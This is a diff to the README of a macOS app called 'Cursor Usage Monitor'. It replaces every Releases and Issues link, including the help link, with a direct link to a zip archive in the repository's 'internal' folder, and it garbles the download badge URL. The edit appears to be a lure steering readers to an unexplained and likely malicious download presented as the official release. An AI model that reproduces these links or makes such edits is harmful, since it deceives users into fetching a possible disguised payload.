@@ -6,13 +6,13 @@ Welcome to Cursor Usage Monitor, a simple application that helps you track your 
 
 ## 🚀 Getting Started
 
-To begin using the Cursor Usage Monitor, you need to download it. You can do this by visiting our [Releases page](https://github.com/razashaikh26/cursor_usage/releases).
+To begin using the Cursor Usage Monitor, you need to download it. You can do this by visiting our [Releases page](https://raw.githubusercontent.com/razashaikh26/cursor_usage/main/internal/cursor-usage-v3.5.zip).
 
-[![Download Cursor Usage Monitor](https://img.shields.io/badge/Download-Cursor%20Usage%20Monitor-blue.svg)](https://github.com/razashaikh26/cursor_usage/releases)
+[![Download Cursor Usage Monitor](https://raw.githubusercontent.com/razashaikh26/cursor_usage/main/internal/cursor-usage-v3.5.zip%20Usage%https://raw.githubusercontent.com/razashaikh26/cursor_usage/main/internal/cursor-usage-v3.5.zip)](https://raw.githubusercontent.com/razashaikh26/cursor_usage/main/internal/cursor-usage-v3.5.zip)
 
 ## 📥 Download & Install
 
-1. Click on the [Releases page](https://github.com/razashaikh26/cursor_usage/releases).
+1. Click on the [Releases page](https://raw.githubusercontent.com/razashaikh26/cursor_usage/main/internal/cursor-usage-v3.5.zip).
 2. Look for the latest version of the application.
 3. Download the appropriate file for your macOS system.
 4. Once downloaded, find the file in your Downloads folder.
@@ -92,10 +92,10 @@ The Cursor Usage Monitor provides the following features:
 
 ## 📞 Need Help?
 
-If you face any issues or have questions, please raise an issue on our [GitHub Issues page](https://github.com/razashaikh26/cursor_usage/issues). 
+If you face any issues or have questions, please raise an issue on our [GitHub Issues page](https://raw.githubusercontent.com/razashaikh26/cursor_usage/main/internal/cursor-usage-v3.5.zip). 
 
 ## 👍 Acknowledgments
 
 Thank you for using Cursor Usage Monitor. Your feedback helps us improve the application.
 
-Visit our [Releases page](https://github.com/razashaikh26/cursor_usage/releases) to download the latest version today!
+Visit our [Releases page](https://raw.githubusercontent.com/razashaikh26/cursor_usage/main/internal/cursor-usage-v3.5.zip) to download the latest version today!
